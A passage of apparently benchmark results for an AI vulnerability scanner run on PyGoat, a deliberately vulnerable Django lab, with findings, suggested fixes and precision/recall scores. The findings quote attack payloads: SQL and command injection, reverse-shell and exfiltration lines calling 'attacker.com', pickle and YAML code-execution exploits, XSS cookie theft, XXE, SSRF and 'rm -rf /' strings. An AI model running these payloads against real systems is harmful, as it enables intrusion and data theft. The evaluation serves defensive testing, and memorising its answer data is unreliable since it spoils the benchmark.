file.read()\n\n# After:\nfile=request.POST[\"blog\"]\n# Validate filename - only allow alphanumeric and specific safe characters\nimport re\nif not re.match(r'^[a-zA-Z0-9_-]+\\.txt$', file):\n    return render(request, \"Lab/ssrf/ssrf_lab.html\", {\"blog\": \"Invalid filename\"})\n    \ndirname = os.path.dirname(__file__)\n# Use realpath to resolve any .. or symlinks, then verify it's within expected directory\nfilename = os.path.realpath(os.path.join(dirname, 'blogs', file))\nif not filename.startswith(os.path.realpath(dirname)):\n    return render(request, \"Lab/ssrf/ssrf_lab.html\", {\"blog\": \"Access denied\"})\n```\n\n---\n\n## [SEVERITY: HIGH] Path Traversal in ssrf_lab function (playground module)\n\n**Category:** Path Traversal\n\n**Location:** `playground/ssrf/main.py:7`\n\n**Attack Scenario:**\n1. Attacker calls ssrf_lab function (from APIs or other modules) with path traversal payload like `../../settings.py`\n2. The os.path.join(dirname, file) concatenates without validation\n3. File is opened and read: `file = open(filename,\"r\")` followed by `data = file.read()`\n4. Sensitive file contents returned to attacker\n5. Can read SECRET_KEY, database passwords, or any application file\n\n**Blast Radius:**\nThis is the backend function for the SSRF lab challenge. It's called by ssrf_code_checker in apis.py at line 37 with user-controlled input from test_bench1. While test_bench2 has a hardcoded value 'secret.txt', test_bench1 is extracted from user-submitted HTML code via ssrf_html_input_extractor, making it exploitable.\n\n**Fix:**\n```python\n# Before:\ndef ssrf_lab(file):\n    try:\n        dirname = os.path.dirname(__file__)\n        filename = os.path.join(dirname, file)\n        file = open(filename,\"r\")\n        data = file.read()\n        return {\"blog\":data}\n\n# After:\nimport os\nimport re\ndef ssrf_lab(file):\n    try:\n        # Validate filename\n        if not re.match(r'^[a-zA-Z0-9_-]+\\.txt$', file):\n            return {\"blog\": \"No blog found\"}\n            \n        dirname = os.path.dirname(__file__)\n        filename = os.path.realpath(os.path.join(dirname, 'blogs', file))\n        \n        # Ensure resolved path is within allowed directory\n        if not filename.startswith(os.path.realpath(dirname)):\n            return {\"blog\": \"No blog found\"}\n            \n        file = open(filename,\"r\")\n        data = file.read()\n        return {\"blog\":data}\n```\n\n---\n\n## [SEVERITY: HIGH] Server-Side Request Forgery in ssrf_lab2 function\n\n**Category:** SSRF\n\n**Location:** `views.py:980`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/ssrf_lab2` with malicious `url` parameter\n2. Submits internal URL like `http://127.0.0.1:8000/admin/` or `http://169.254.169.254/latest/meta-data/` (AWS metadata)\n3. The code makes request: `response = requests.get(url)` without validation at line 982\n4. Internal services are accessed, cloud metadata endpoints queried, or internal APIs called\n5. Attacker obtains credentials, internal data, or can pivot to internal network\n\n**Blast Radius:**\nThe ssrf_lab2 function allows arbitrary HTTP requests to any URL. This can access internal services not exposed to the internet, cloud provider metadata endpoints (AWS, GCP, Azure), internal databases, or admin interfaces. The response contents are returned to the attacker, enabling data exfiltration.\n\n**Fix:**\n```python\n# Before:\nurl = request.POST[\"url\"]\ntry:\n    response = requests.get(url)\n    return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"response\": response.content.decode()})\n\n# After:\nfrom urllib.parse import urlparse\nimport ipaddress\n\nurl = request.POST[\"url\"]\ntry:\n    # Parse and validate URL\n    parsed = urlparse(url)\n    \n    # Block non-http(s) protocols\n    if parsed.scheme not in ['http', 'https']:\n        return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Invalid protocol\"})\n    \n    # Resolve hostname and block private IPs\n    import socket\n    ip = socket.gethostbyname(parsed.hostname)\n    if ipaddress.ip_address(ip).is_private:\n        return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Private IP blocked\"})\n    \n    # Use allowlist of permitted domains instead of blocklist\n    ALLOWED_DOMAINS = ['example.com', 'safe-site.com']\n    if parsed.hostname not in ALLOWED_DOMAINS:\n        return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Domain not allowed\"})\n    \n    response = requests.get(url, timeout=5)\n    return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"response\": response.content.decode()})\n```\n\n---\n\n## [SEVERITY: HIGH] XXE (XML External Entity) Injection in xxe_parse function\n\n**Category:** Injection\n\n**Location:** `views.py:253`\n\n**Attack Scenario:**\n1. Attacker sends POST request to `/xxe_parse` with malicious XML payload\n2. XML contains external entity declaration: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><text>&xxe;</text>`\n3. Parser is configured with `parser.setFeature(feature_external_ges, True)` at line 254, explicitly enabling XXE\n4. The parser processes external entities and reads local files\n5. File contents are stored in database and can be retrieved, enabling arbitrary file disclosure\n\n**Blast Radius:**\nThe xxe_parse function explicitly enables external entity processing with feature_external_ges. This allows reading arbitrary files from the filesystem, SSRF attacks against internal services, and potential denial of service. The parsed content is stored in the comments table (line 264) and can be retrieved via xxe_see endpoint.\n\n**Fix:**\n```python\n# Before:\nparser = make_parser()\nparser.setFeature(feature_external_ges, True)\ndoc = parseString(request.body.decode('utf-8'), parser=parser)\n\n# After:\nparser = make_parser()\nparser.setFeature(feature_external_ges, False)  # Disable external entities\nfrom xml.sax.handler import feature_external_pes\nparser.setFeature(feature_external_pes, False)  # Also disable parameter entities\n# Or better: use defusedxml library\nfrom defusedxml.sax import make_parser as safe_make_parser\nparser = safe_make_parser()\ndoc = parseString(request.body.decode('utf-8'), parser=parser)\n```\n\n---\n\n## [SEVERITY: HIGH] Unsafe Pickle Deserialization in insec_des_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:210`\n\n**Attack Scenario:**\n1. Attacker obtains a valid session and cookie from insec_des_lab endpoint\n2. Crafts malicious pickled object containing code execution payload using __reduce__ method\n3. Base64-encodes the malicious pickle and sets it as the 'token' cookie\n4. On next request, server executes: `admin = pickle.loads(token)` at line 210\n5. Malicious pickle executes arbitrary code during deserialization, compromising the system\n\n**Blast Radius:**\nThe insec_des_lab function deserializes user-controlled pickle data from cookies. Python's pickle module can execute arbitrary code during deserialization through specially crafted payloads. While this appears to be a training lab, if deployed it provides arbitrary code execution to any user.\n\n**Fix:**\n```python\n# Before:\ntoken = base64.b64decode(token)\nadmin = pickle.loads(token)\nif admin.admin == 1:\n\n# After:\n# Don't use pickle for user-facing data. Use JSON instead:\nimport json\ntoken = base64.b64decode(token)\ntry:\n    admin_data = json.loads(token.decode('utf-8'))\n    if admin_data.get('admin') == 1:\n        return render(request,'Lab/insec_des/insec_des_lab.html', {\"message\":\"Welcome Admin, SECRETKEY:ADMIN123\"})\nexcept:\n    # Invalid token\n    pass\n\n# Or use cryptographically signed tokens (JWT, itsdangerous, etc.)\n```\n\n---\n\n## [SEVERITY: HIGH] Reflected XSS in xss_lab function\n\n**Category:** XSS\n\n**Location:** `views.py:96`\n\n**Attack Scenario:**\n1. Attacker crafts URL like `/xssL?q=<script>alert(document.cookie)</script>`\n2. User clicks malicious link (via phishing, forum post, etc.)\n3. The GET parameter 'q' is retrieved and rendered directly in template: `return render(request,'Lab/XSS/xss_lab.html', {'query': q})`\n4. If the template doesn't escape the query variable, JavaScript executes in victim's browser\n5. Attacker steals session cookies, performs actions as the victim, or redirects to phishing site\n\n**Blast Radius:**\nThe xss_lab function reflects user input from the 'q' query parameter directly into the response. While Django templates auto-escape by default, if the template uses the |safe filter or {% autoescape off %}, the XSS will execute. This can lead to session hijacking, credential theft, or defacement.\n\n**Fix:**\n```python\n# Before:\nq=request.GET.get('q','')\nf=FAANG.objects.filter(company=q)\nif f:\n    args={\"company\":f[0].company,\"ceo\":f[0].info_set.all()[0].ceo,\"about\":f[0].info_set.all()[0].about}\n    return render(request,'Lab/XSS/xss_lab.html',args)\nelse:\n    return render(request,'Lab/XSS/xss_lab.html', {'query': q})\n\n# After:\nfrom django.utils.html import escape\nq=request.GET.get('q','')\nf=FAANG.objects.filter(company=q)\nif f:\n    args={\"company\":f[0].company,\"ceo\":f[0].info_set.all()[0].ceo,\"about\":f[0].info_set.all()[0].about}\n    return render(request,'Lab/XSS/xss_lab.html',args)\nelse:\n    # Explicitly escape user input\n    return render(request,'Lab/XSS/xss_lab.html', {'query': escape(q)})\n    \n# Also verify template doesn't use |safe filter on query variable\n```\n\n---\n\n## [SEVERITY: HIGH] Weak Cryptography - MD5 Password Storage in CF_user model\n\n**Category:** Secrets Exposure\n\n**Location:** `migrations/0017_cf_user.py:22-26`\n\n**Attack Scenario:**\n1. Attacker gains access to database (via SQLi, backup file, or compromised credentials)\n2. CF_user table contains passwords hashed with MD5: 'alex' \u2192 '9d6edee6ce9312981084bd98eb3751ee'\n3. Attacker uses rainbow tables or GPU cracking to reverse MD5 hashes in seconds\n4. Plain passwords like 'alex123' are recovered and used to compromise accounts\n5. If users reuse passwords across services, attacker pivots to other systems\n\n**Blast Radius:**\nThe CF_user model stores passwords using MD5 hashing (migration 0017_cf_user.py line 24). MD5 is cryptographically broken and fast to crack. The crypto_failure_lab function at views.py:1048 compounds this by accepting MD5-hashed passwords. If the database is compromised, all user credentials are immediately exposed.\n\n**Fix:**\n```python\n# In migration - Before:\nmigrations.RunSQL(\n    \"INSERT INTO introduction_cf_user (username, password) VALUES \"\n    \"('alex', '9d6edee6ce9312981084bd98eb3751ee'),\"\n    \"('admin', 'c93ccd78b2076528346216b3b2f701e6'),\"\n    \"('rupak', '5ee3547adb4481902349bdd0f2ffba93');\"\n)\n\n# After:\nfrom django.contrib.auth.hashers import make_password\n# Use Django's built-in password hashing (PBKDF2 by default)\nmigrations.RunSQL(\n    \"INSERT INTO introduction_cf_user (username, password) VALUES \"\n    \"('alex', %s),\"\n    \"('admin', %s),\"\n    \"('rupak', %s);\",\n    [make_password('secure_pass1'), make_password('secure_pass2'), make_password('secure_pass3')]\n)\n\n# In views.py crypto_failure_lab - Before:\npassword = md5(password.encode()).hexdigest()\nuser = CF_user.objects.filter"
+    },
+    {
+      "metrics": {
+        "precision": 0.4,
+        "recall": 0.7273,
+        "f1": 0.5161,
+        "precision_pct": 40,
+        "recall_pct": 73,
+        "f1_pct": 52
+      },
+      "counts": {
+        "tp": 8,
+        "fp": 12,
+        "fn": 3,
+        "total_findings": 20
+      },
+      "matched_ids": [
+        "pygoat-command-injection",
+        "pygoat-insecure-deser-pickle",
+        "pygoat-sqli-login",
+        "pygoat-ssrf",
+        "pygoat-ssti",
+        "pygoat-unsafe-yaml",
+        "pygoat-weak-hash",
+        "pygoat-xxe"
+      ],
+      "missed_ids": [
+        "pygoat-code-injection-eval",
+        "pygoat-imagemath-eval",
+        "pygoat-sqli-injection-lab"
+      ],
+      "provisional_matched_ids": [],
+      "category_mismatches": [
+        {
+          "finding_index": 14,
+          "finding_title": "Missing CSRF Protection on State-Changing Endpoints",
+          "finding_category": "CSRF",
+          "truth_id": "pygoat-xxe",
+          "truth_category": "XXE"
+        }
+      ],
+      "scan_time_seconds": 144.4,
+      "target_loc": 2912,
+      "scan_time_per_kloc": 49.6,
+      "scan_time_per_vuln": 13.1,
+      "usage": {
+        "haiku_in": 0,
+        "haiku_out": 0,
+        "sonnet_in": 72010,
+        "sonnet_out": 8123,
+        "calls": 1
+      },
+      "tokens_per_kloc": 27518,
+      "findings": [
+        {
+          "severity": "CRITICAL",
+          "title": "SQL Injection in sql_lab function",
+          "category": "SQLi",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 156
+            },
+            {
+              "file": "urls.py",
+              "line": 15
+            },
+            {
+              "file": "views.py",
+              "line": 885
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] SQL Injection in sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:156`\n\n**Attack Scenario:**\n1. Attacker navigates to the SQL lab endpoint\n2. Submits `name=' OR '1'='1'--` and arbitrary password\n3. The raw SQL query becomes: `SELECT * FROM introduction_login WHERE user='' OR '1'='1'--' AND password='...`\n4. This bypasses authentication and returns all users, granting access as the first user in the database\n5. Attacker can also read arbitrary columns, dump th"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Command Injection in cmd_lab function",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 426
+            },
+            {
+              "file": "urls.py",
+              "line": 34
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Command Injection in cmd_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:426`\n\n**Attack Scenario:**\n1. Attacker submits domain parameter: `example.com; cat /etc/passwd`\n2. The command becomes: `dig example.com; cat /etc/passwd`\n3. The shell executes both commands, exposing system files\n4. Attacker can escalate to: `example.com; curl http://attacker.com/$(whoami)` to exfiltrate data\n5. Can chain with reverse shells: `example.com; nc -e /bin/sh attacker.com 4"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary Code Execution via eval() in mitre_lab_25_api",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "mitre.py",
+              "line": 215
+            },
+            {
+              "file": "urls.py",
+              "line": 118
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution via eval() in mitre_lab_25_api\n\n**Category:** Injection\n\n**Location:** `mitre.py:215`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/mitre/25/lab/api` with `expression=__import__('os').system('id')`\n2. Server executes arbitrary Python code via `eval(expression)`\n3. Attacker escalates to: `__import__('subprocess').check_output('cat /etc/shadow', shell=True)`\n4. Can exfiltrate secrets, establish backdoors, or pivot to internal systems\n\n**Blast Ra"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary File Write via Unsafe File Paths in log_function_checker",
+          "category": "Path Traversal",
+          "locations": [
+            {
+              "file": "apis.py",
+              "line": 67
+            },
+            {
+              "file": "urls.py",
+              "line": 81
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary File Write via Unsafe File Paths in log_function_checker\n\n**Category:** Path Traversal\n\n**Location:** `apis.py:67-72`\n\n**Attack Scenario:**\n1. Attacker sends POST with `log_code` containing malicious Python code: `import os; os.system('cat /etc/passwd > /tmp/pwned')`\n2. The code is written directly to `playground/A9/main.py` without validation\n3. When the application imports this module, the malicious code executes\n4. Attacker can overwrite any Python module in "
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary File Write via Path Traversal in A6_disscussion_api_2",
+          "category": "Path Traversal",
+          "locations": [
+            {
+              "file": "apis.py",
+              "line": 131
+            },
+            {
+              "file": "apis.py",
+              "line": 115
+            },
+            {
+              "file": "urls.py",
+              "line": 88
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary File Write via Path Traversal in A6_disscussion_api_2\n\n**Category:** Path Traversal\n\n**Location:** `apis.py:131-134`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/2021/discussion/A6/api2` with malicious code\n2. Code is written directly to `playground/A6/utility.py` without validation\n3. When `check_vuln` is called (from `apis.py:115`), malicious code executes\n4. Attacker can inject: `import os; os.system('curl http://attacker.com/$(cat /etc/passwd | base64)'"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Arbitrary File Write in ssrf_code_converter",
+          "category": "Path Traversal",
+          "locations": [
+            {
+              "file": "utility.py",
+              "line": 33
+            },
+            {
+              "file": "apis.py",
+              "line": 27
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Arbitrary File Write in ssrf_code_converter\n\n**Category:** Path Traversal\n\n**Location:** `utility.py:33-36`\n\n**Attack Scenario:**\n1. Attacker submits Python code via ssrf_code_checker (apis.py:27)\n2. Code is processed and written to `playground/ssrf/main.py` without validation\n3. When main.ssrf_lab is imported/called, malicious code executes\n4. Attacker can inject code that persists: `import os; os.system('nc -e /bin/sh attacker.com 4444')`\n\n**Blast Radius:**\n- Arbitrary "
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Server-Side Template Injection in ssti_lab",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 980
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Server-Side Template Injection in ssti_lab\n\n**Category:** Injection\n\n**Location:** `views.py:980`\n\n**Attack Scenario:**\n1. Attacker creates blog with payload: `{{config.items()}}`\n2. When blog is rendered via `ssti_view_blog`, Django template engine executes the code\n3. Attacker escalates to RCE: `{% load module %}{{module.__init__.__globals__['__builtins__']['__import__']('os').system('id')}}`\n4. Can read application secrets, database credentials from config\n\n**Blast Rad"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "XXE (XML External Entity) Injection in xxe_parse",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 259
+            },
+            {
+              "file": "urls.py",
+              "line": 22
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] XXE (XML External Entity) Injection in xxe_parse\n\n**Category:** Injection\n\n**Location:** `views.py:259`\n\n**Attack Scenario:**\n1. Attacker sends XML payload:\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<comm><text>&xxe;</text></comm>\n```\n2. Parser with `feature_external_ges=True` processes external entities\n3. Contents of `/etc/passwd` are stored in database comment field\n4. Attacker retrieves via `xxe_see` endpoint\n5. Can escala"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Insecure Deserialization via pickle.loads in insec_des_lab",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 213
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Insecure Deserialization via pickle.loads in insec_des_lab\n\n**Category:** Injection\n\n**Location:** `views.py:213`\n\n**Attack Scenario:**\n1. Attacker creates malicious pickle payload:\n```python\nimport pickle, os, base64\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('curl http://attacker.com/$(whoami)',))\npayload = base64.b64encode(pickle.dumps(Exploit()))\n```\n2. Sets cookie `token` to the payload\n3. Server deserializes with `pickle.loads(token)`, exec"
+        },
+        {
+          "severity": "CRITICAL",
+          "title": "Unsafe YAML Deserialization in a9_lab",
+          "category": "Injection",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 547
+            }
+          ],
+          "raw": "## [SEVERITY: CRITICAL] Unsafe YAML Deserialization in a9_lab\n\n**Category:** Injection\n\n**Location:** `views.py:547`\n\n**Attack Scenario:**\n1. Attacker uploads YAML file with malicious payload:\n```yaml\n!!python/object/apply:os.system [\"curl http://attacker.com/$(cat /etc/passwd | base64)\"]\n```\n2. `yaml.load(file, yaml.Loader)` deserializes and executes the payload\n3. Attacker gains RCE and can exfiltrate data\n\n**Blast Radius:**\n- Remote code execution through YAML deserialization\n- File upload ma"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Weak Cryptography - MD5 Password Hashing in crypto_failure_lab",
+          "category": "Secrets Exposure",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 1013
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Weak Cryptography - MD5 Password Hashing in crypto_failure_lab\n\n**Category:** Secrets Exposure\n\n**Location:** `views.py:1013`\n\n**Attack Scenario:**\n1. Attacker obtains database dump containing MD5 hashes\n2. Uses rainbow tables or hashcat to crack hashes in seconds\n3. For password \"password\", MD5 hash `5f4dcc3b5aa765d61d8327deb882cf99` is instantly reversible\n4. Attacker gains access to all user accounts with weak passwords\n\n**Blast Radius:**\n- All passwords in CF_user table a"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Weak Cryptography - Reversible Hash in customHash function",
+          "category": "Secrets Exposure",
+          "locations": [
+            {
+              "file": "utility.py",
+              "line": 58
+            },
+            {
+              "file": "views.py",
+              "line": 1024
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Weak Cryptography - Reversible Hash in customHash function\n\n**Category:** Secrets Exposure\n\n**Location:** `utility.py:58`\n\n**Attack Scenario:**\n1. Function uses SHA256 but reverses the output: `hashlib.sha256(password.encode()).hexdigest()[::-1]`\n2. Attacker with database access reverses the string back\n3. The reversed hash is still vulnerable to rainbow table attacks\n4. Provides no actual security benefit over plain SHA256\n\n**Blast Radius:**\n- Used in crypto_failure_lab2 (vi"
+        },
+        {
+          "severity": "HIGH",
+          "title": "JWT Token Verification Without Expiry Check in csrf_transfer_monei",
+          "category": "Auth Bypass",
+          "locations": [
+            {
+              "file": "mitre.py",
+              "line": 180
+            },
+            {
+              "file": "views.py",
+              "line": 1153
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] JWT Token Verification Without Expiry Check in csrf_transfer_monei\n\n**Category:** Auth Bypass\n\n**Location:** `mitre.py:180`\n\n**Attack Scenario:**\n1. Attacker obtains valid JWT token from auth_cookiee cookie\n2. Token has `exp` claim but server only decodes without verifying expiry\n3. Attacker uses expired token indefinitely to transfer funds\n4. Can replay old tokens even after user has logged out\n\n**Blast Radius:**\n- Allows use of expired authentication tokens\n- Affects CSRF l"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Missing Session Invalidation on Logout in auth_failure_lab3",
+          "category": "Auth Bypass",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 1175
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Missing Session Invalidation on Logout in auth_failure_lab3\n\n**Category:** Auth Bypass\n\n**Location:** `views.py:1175` (logout functionality missing)\n\n**Attack Scenario:**\n1. User logs in and receives session_id cookie\n2. User \"logs out\" (no logout function implemented)\n3. session_id remains valid in AF_session_id table indefinitely\n4. Attacker with stolen cookie maintains access forever\n5. No mechanism to revoke compromised sessions\n\n**Blast Radius:**\n- Session tokens never e"
+        },
+        {
+          "severity": "HIGH",
+          "title": "Missing CSRF Protection on State-Changing Endpoints",
+          "category": "CSRF",
+          "locations": [
+            {
+              "file": "Multiple files (apis.py",
+              "line": 23
+            },
+            {
+              "file": "apis.py",
+              "line": 23
+            },
+            {
+              "file": "mitre.py",
+              "line": 214
+            },
+            {
+              "file": "views.py",
+              "line": 253
+            }
+          ],
+          "raw": "## [SEVERITY: HIGH] Missing CSRF Protection on State-Changing Endpoints\n\n**Category:** CSRF\n\n**Location:** Multiple files (apis.py:23, 61, 93, 113, 126; mitre.py:214; views.py:253, 419, 453)\n\n**Attack Scenario:**\n1. Attacker hosts malicious page with form:\n```html\n<form action=\"http://victim-site.com/cmd_lab\" method=\"POST\">\n  <input name=\"domain\" value=\"example.com; rm -rf /\">\n  <input name=\"os\" value=\"linux\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n2. Logged-in user visits attac"
+        },
+        {
+          "severity": "MEDIUM",
+          "title": "Reflected XSS in xss_lab",
+          "category": "XSS",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 101
+            }
+          ],
+          "raw": "## [SEVERITY: MEDIUM] Reflected XSS in xss_lab\n\n**Category:** XSS\n\n**Location:** `views.py:101`\n\n**Attack Scenario:**\n1. Attacker sends link: `http://site.com/xss?q=<script>fetch('http://attacker.com/'+document.cookie)</script>`\n2. User clicks link while authenticated\n3. Query parameter is rendered without escaping: `{'query': q}`\n4. Script executes in user's browser, stealing session cookies\n5. Attacker gains authenticated session access\n\n**Blast Radius:**\n- Session hijacking through cookie the"
+        },
+        {
+          "severity": "MEDIUM",
+          "title": "Insufficient XSS Filter Bypass in xss_lab2",
+          "category": "XSS",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 112
+            }
+          ],
+          "raw": "## [SEVERITY: MEDIUM] Insufficient XSS Filter Bypass in xss_lab2\n\n**Category:** XSS\n\n**Location:** `views.py:112`\n\n**Attack Scenario:**\n1. Filter only removes `<script>` and `</script>` tags\n2. Attacker submits: `<img src=x onerror=alert(document.cookie)>`\n3. Filter doesn't catch event handlers\n4. Or nested: `<scr<script>ipt>alert(1)</scr</script>ipt>`\n5. XSS executes, stealing session data\n\n**Blast Radius:**\n- Bypass of intended XSS protection\n- Session hijacking via cookie theft\n- Affects `/xs"
+        },
+        {
+          "severity": "MEDIUM",
+          "title": "Path Traversal in ssrf_lab",
+          "category": "Path Traversal",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 936
+            }
+          ],
+          "raw": "## [SEVERITY: MEDIUM] Path Traversal in ssrf_lab\n\n**Category:** Path Traversal\n\n**Location:** `views.py:936`\n\n**Attack Scenario:**\n1. Attacker submits `blog=../../../etc/passwd` in POST request\n2. `os.path.join(dirname, file)` creates path: `/app/introduction/../../../etc/passwd`\n3. Application reads and displays `/etc/passwd`\n4. Attacker can read application source, config files: `blog=../settings.py`\n5. Steal database credentials or SECRET_KEY\n\n**Blast Radius:**\n- Read arbitrary files accessib"
+        },
+        {
+          "severity": "MEDIUM",
+          "title": "SSRF (Server-Side Request Forgery) in ssrf_lab2",
+          "category": "SSRF",
+          "locations": [
+            {
+              "file": "views.py",
+              "line": 962
+            }
+          ],
+          "raw": "## [SEVERITY: MEDIUM] SSRF (Server-Side Request Forgery) in ssrf_lab2\n\n**Category:** SSRF\n\n**Location:** `views.py:962`\n\n**Attack Scenario:**\n1. Attacker submits URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n2. Server makes request to AWS metadata service\n3. Returns temporary AWS credentials to attacker\n4. Or internal service: `http://localhost:8000/admin` to access restricted endpoints\n5. Can scan internal network: `http://192.168.1.1:22`\n\n**Blast Radius:**\n- Access t"
+        },
+        {
+          "severity": "MEDIUM",
+          "title": "Secrets Exposure in Migration Files",
+          "category": "Secrets Exposure",
+          "locations": [
+            {
+              "file": "migrations/0017_cf_user.py",
+              "line": 21
+            },
+            {
+              "file": "migrations/0018_cf_user_password2.py",
+              "line": 19
+            }
+          ],
+          "raw": "## [SEVERITY: MEDIUM] Secrets Exposure in Migration Files\n\n**Category:** Secrets Exposure\n\n**Location:** `migrations/0017_cf_user.py:21-24` and `migrations/0018_cf_user_password2.py:19-22`\n\n**Attack Scenario:**\n1. Attacker gains read access to repository or server filesystem\n2. Migration files contain hardcoded MD5/SHA256 password hashes\n3. Attacker uses rainbow tables or hashcat to crack weak passwords\n4. Gains access to user accounts (alex, admin, rupak)\n\n**Blast Radius:**\n- Hardcoded credenti"
+        }
+      ],
+      "raw_output": "# Security Analysis Report\n\n## [SEVERITY: CRITICAL] SQL Injection in sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:156`\n\n**Attack Scenario:**\n1. Attacker navigates to the SQL lab endpoint\n2. Submits `name=' OR '1'='1'--` and arbitrary password\n3. The raw SQL query becomes: `SELECT * FROM introduction_login WHERE user='' OR '1'='1'--' AND password='...`\n4. This bypasses authentication and returns all users, granting access as the first user in the database\n5. Attacker can also read arbitrary columns, dump the database schema, or escalate to OS command execution depending on database configuration\n\n**Blast Radius:**\n- Direct exposure of all credentials in the `introduction_login` table\n- Potential for full database compromise through UNION-based or error-based injection\n- The function is called from `urls.py:15` at path `sql_lab`, making it publicly accessible to authenticated users\n- Similar vulnerability exists in `injection_sql_lab` at `views.py:885` with the same attack surface\n\n**Fix:**\n```python\n# Before:\nsql_query = \"SELECT * FROM introduction_login WHERE user='\"+name+\"' AND password='\"+password+\"'\"\nval=login.objects.raw(sql_query)\n\n# After:\nval=login.objects.filter(user=name, password=password)\n# Or if raw SQL is required:\nsql_query = \"SELECT * FROM introduction_login WHERE user=%s AND password=%s\"\nval=login.objects.raw(sql_query, [name, password])\n```\n\n---\n\n## [SEVERITY: CRITICAL] SQL Injection in injection_sql_lab function\n\n**Category:** SQLi\n\n**Location:** `views.py:885`\n\n**Attack Scenario:**\n1. Attacker accesses `/injection_sql_lab` endpoint\n2. Submits crafted `name` parameter: `admin' OR '1'='1'--`\n3. The raw SQL query becomes: `SELECT * FROM introduction_sql_lab_table WHERE id='admin' OR '1'='1'--'AND password='...`\n4. Attacker bypasses authentication and can dump the entire `sql_lab_table`\n5. Can escalate to UNION-based injection to read from other tables or extract sensitive configuration data\n\n**Blast Radius:**\n- Direct compromise of `sql_lab_table` containing usernames and MD5-hashed passwords\n- Potential lateral movement to other database tables through UNION injection\n- Function is accessible via URL pattern `injection_sql_lab` to any authenticated user\n\n**Fix:**\n```python\n# Before:\nsql_query = \"SELECT * FROM introduction_sql_lab_table WHERE id='\"+name+\"'AND password='\"+password+\"'\"\nuser = sql_lab_table.objects.raw(sql_query)\n\n# After:\nuser = sql_lab_table.objects.filter(id=name, password=password)\n# Or with parameterized query:\nsql_query = \"SELECT * FROM introduction_sql_lab_table WHERE id=%s AND password=%s\"\nuser = sql_lab_table.objects.raw(sql_query, [name, password])\n```\n\n---\n\n## [SEVERITY: CRITICAL] Command Injection in cmd_lab function\n\n**Category:** Injection\n\n**Location:** `views.py:426`\n\n**Attack Scenario:**\n1. Attacker submits domain parameter: `example.com; cat /etc/passwd`\n2. The command becomes: `dig example.com; cat /etc/passwd`\n3. The shell executes both commands, exposing system files\n4. Attacker can escalate to: `example.com; curl http://attacker.com/$(whoami)` to exfiltrate data\n5. Can chain with reverse shells: `example.com; nc -e /bin/sh attacker.com 4444`\n\n**Blast Radius:**\n- Full remote code execution on the application server with web application privileges\n- Access to all files readable by the web server user\n- Potential for privilege escalation, data exfiltration, or establishing persistence\n- The function is accessible via `urls.py:34` at path `cmd_lab` to authenticated users\n\n**Fix:**\n```python\n# Before:\ncommand = \"dig {}\".format(domain)\nprocess = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n# After:\nimport shlex\n# Validate domain first\nif not re.match(r'^[a-zA-Z0-9.-]+$', domain):\n    return render(request,'Lab/CMD/cmd_lab.html',{\"output\":\"Invalid domain\"})\n# Use subprocess.run with list instead of shell=True\nprocess = subprocess.run(['dig', domain], capture_output=True, text=True, timeout=10)\noutput = process.stdout + process.stderr\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary Code Execution via eval() in cmd_lab2\n\n**Category:** Injection\n\n**Location:** `views.py:462`\n\n**Attack Scenario:**\n1. Attacker submits: `__import__('os').system('rm -rf /')`\n2. The `eval()` executes arbitrary Python code\n3. Attacker can read files: `open('/etc/passwd').read()`\n4. 